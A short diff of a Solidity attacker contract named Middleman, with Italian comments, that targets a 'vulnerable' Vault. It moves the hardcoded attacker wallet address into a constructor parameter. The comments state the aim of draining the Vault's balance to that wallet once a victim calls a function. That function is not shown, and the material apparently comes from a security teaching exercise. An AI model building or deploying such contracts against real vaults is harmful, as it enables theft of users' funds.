@@ -5,14 +5,13 @@ import "vault.sol";
 
 contract Middleman {
     Vault public vault;
+    address public attackerWallet;
 
-    // Vogliamo rubare il saldo del Vault ed esfiltrarlo qui.
-    address attackerWallet = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
-
-    constructor(address payable vulerableVault) {
+    constructor(address payable _vulerableVault, address payable _attackerWallet) {
         // Otteniamo un riferimento all'istanza deployata del vault
         // cosi' da poterci interfacciare con esso
-        vault = Vault(vulerableVault);
+        vault = Vault(_vulerableVault);
+        attackerWallet = _attackerWallet;
     }
 
     // Se la vittima chiama questa, possiamo prosciugare il balance del Vault
